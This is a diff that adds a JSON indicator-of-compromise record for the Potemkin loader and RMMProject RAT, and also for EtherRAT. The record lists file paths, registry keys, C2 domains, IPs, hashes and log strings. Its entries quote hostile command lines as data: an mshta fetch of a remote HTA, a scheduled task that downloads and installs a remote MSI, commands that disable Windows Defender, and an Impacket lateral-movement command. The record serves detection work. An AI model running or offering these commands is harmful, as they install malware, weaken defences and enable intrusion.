@@ -1,0 +1,457 @@
+{
+  "malware_family": "Potemkin and RMMProject",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Potemkin is a custom loader that uses a deterministic Domain Generation Algorithm (DGA) and reflective loading to deliver its payload. The main payload, RMMProject, is a Lua-scriptable RAT featuring browser credential theft with a Chrome App-Bound Encryption bypass, a hidden remote desktop module, and process injection capabilities. The malware establishes persistence via Run keys and creates a unique identifier file on disk to track victims.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "cmd /min /c \"pcalua.exe -a mshta.exe -c https://cl.distritovagas.com/hte.hta\"\\1",
+      "context": "Initial execution via Windows Run Dialog to fetch HTA payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\RunSearch\\RunSearch.exe",
+      "context": "Installation path for the Potemkin loader executable.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\RunSearch",
+      "context": "Persistence registry key created by the MSI installer for Potemkin.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%LOCALAPPDATA%\\hyper-v.ver",
+      "context": "File storing the C2-assigned client UUID for Potemkin.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dll_debug.log",
+      "context": "Potemkin's local debug log file, created in %TEMP%.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "151678",
+      "context": "Hardcoded XorShift32 seed for Potemkin's Domain Generation Algorithm.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[Agent] DLL returned (updatedll), reloading...",
+      "context": "Potemkin log string indicating a module is being hot-reloaded.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[DNS] exhausted all 10000 domains, none responded",
+      "context": "Potemkin log string when its DGA fails to find a live C2.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1015",
+      "context": "The only task code used by Potemkin, signaling a DLL load task.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "test_agent",
+      "context": "Hardcoded 'loader_id' value sent by Potemkin in C2 requests.",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "TLSDataStart",
+      "context": "The export Potemkin's reflective loader calls in the fetched RMMProject DLL.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "updatedll",
+      "context": "Signal string returned by a loaded module to trigger a hot-reload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "kCookies: total_cookies=",
+      "context": "RMMProject debug string logged after stealing browser cookies.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[RTSC] OpenInputSocket: sending session_id=",
+      "context": "RMMProject log string for its hidden remote desktop module handshake.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SELECT item1 FROM metadata WHERE id = 'password'",
+      "context": "SQL query used by RMMProject to read Firefox master password hash.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SELECT a11 FROM nssPrivate",
+      "context": "SQL query used by RMMProject to extract Firefox encrypted private keys.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x5A",
+      "context": "Single-byte XOR key used to encode the embedded ABE helper DLL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ABEPayloadArgs",
+      "context": "Name of the shared memory section used by the ABE bypass helper DLL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "conhost --headless “C:\\Users\\Administrator\\AppData\\Local\\FdgW2ni2h0it\\sq8whb\\node.exe” “C:\\Users\\Administrator\\AppData\\Local\\FdgW2ni2h0it\\EkYqfsgfyz.ini”",
+      "context": "EtherRAT persistence command line, wrapping node.exe in a hidden console.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "EdgeUpdate",
+      "context": "Run key value name used by EtherRAT for persistence.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ab653feb-9e78-4578-87ed-2e30329fe858",
+      "context": "Hardcoded build identifier for the EtherRAT payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Users\\username\\AppData\\Local\\Temp\\cloudflared\\svchost.exe tunnel --url http://127.0.0.1:31024 --protocol http2 --no-autoupdate --loglevel info --logfile C:\\Users\\usernam\\AppData\\Local\\Temp\\cloudflared_tunnel.log",
+      "context": "Cloudflare tunnel created by the actor for persistent remote access.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Cloudflared",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /Q /c whoami /groups | findstr /i admin 1> \\Windows\\Temp\\DqNtxC 2>&1",
+      "context": "Reconnaissance command executed via WMIExec, characteristic of Impacket.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Impacket",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Stop-Service WinDefend -Force; sc.exe config WinDefend start= disabled; sc.exe stop WinDefend",
+      "context": "Command sequence to disable the Windows Defender service.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "schtasks /create /tn msiInstall2 /tr \"msiexec.exe /i http://77.110.122.58:23205/cons_1.0.1.msi /quiet /norestart /l*v C:\\ProgramData\\p\\msi.log\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn msiInstall2",
+      "context": "Scheduled task creation for persistence to download and run an MSI.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "(Get-MpComputerStatus).RealTimeProtectionEnabled",
+      "context": "PowerShell command used by actor to check if Defender is disabled.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\p",
+      "context": "Defender exclusion path created by the attacker for staging tools.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "ekShell2",
+      "context": "Scheduled task name for a PowerShell reverse shell.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\system32\\cmd.exe /Q /c echo cmd /c msiexec /i \\\\77.110.122.58\\ADMIN$\\Temp\\EGGjVyW9Uloz.msi /qn ^> \\\\<HOST>\\C$\\<8chars> 2^>^&1 > C:\\Windows\\TEMP\\<6chars>.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\<6chars>.bat & C:\\Windows\\system32\\cmd.exe /Q /c del C:\\Windows\\TEMP\\<6chars>.bat",
+      "context": "SMBExec command used for lateral movement to deploy an MSI.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Impacket",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://cl.distritovagas.com/hte.hta",
+      "context": "Initial HTA payload URL fetched by the ClickFix command.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://sonra.eutialyson.com/inst24.msi",
+      "context": "URL for the MSI installer, downloaded by the HTA payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/client_hello",
+      "context": "Potemkin DGA liveness probe path, used to find a live C2.",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "cpp-httplib/0.12.1",
+      "context": "User-Agent string for all Potemkin C2 communications.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "cpp-httplib"
+    },
+    {
+      "kind": "other",
+      "value": "ok",
+      "context": "Keyword Potemkin checks for in the C2 probe response body.",
+      "specificity": "medium",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": ".xyz",
+      "context": "Top-level domain used for all DGA-generated domains.",
+      "specificity": "medium",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "anus-staylard.xyz",
+      "context": "Example of a DGA-generated domain observed in a Wireshark capture.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/client/new",
+      "context": "Potemkin endpoint for registering a new client and getting a UUID.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/tasks/get_worker",
+      "context": "Potemkin endpoint to poll for new tasks from the C2.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/tasks/collect",
+      "context": "Potemkin endpoint to send task acknowledgements to the C2.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/avast_update",
+      "context": "Potemkin endpoint used to fetch the RMMProject DLL payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "resumeacceptable.com",
+      "context": "EtherRAT C2 domain resolved from the Ethereum blockchain.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "0xb3f2897f2bc797e5b9033faef8c81e92b01cb831",
+      "context": "Ethereum smart contract address used by EtherRAT to resolve its C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "77.110.122.58",
+      "context": "Primary C2 and staging server used for hands-on-keyboard activity.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "213.165.41.26",
+      "context": "C2 server for the Chisel reverse SOCKS tunnel.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "77.110.122.58:43301",
+      "context": "IP and port for the persistent PowerShell reverse shell C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "2abe5dd3a057fdef935722e50e9251c272d29fd26113187b853a1f9a9cb89d9b",
+      "description": "Potemkin Loader (RunSearch.exe)"
+    },
+    {
+      "sha256": "3b7ae925e2d64522b4f69b56285b05aeca8c5aab5ab46a9c02c4fafb69d881ce",
+      "description": "RMMProject RAT payload (avast_update.bin)"
+    },
+    {
+      "sha256": "cd4e5e2c65b1660470d3446539ee68adf5faeece3eaeb46583623be9911ee145",
+      "description": "Embedded ABE helper DLL for Chrome/Edge credential theft"
+    },
+    {
+      "sha256": "79f7b67ce8b39070f3e1c2b90fce0ce84134782a7dedcccc1edac197ee9e089b",
+      "description": "MSI installer that drops Potemkin loader (inst24.msi)"
+    },
+    {
+      "sha256": "2ada24dd6e517f37942b749c2bd57ddd97445e9853002cee70a0bc30d0b0ce3a",
+      "description": "MSI installer that delivers EtherRAT (cons_1.0.1.msi)"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "document"
+  ]
+}
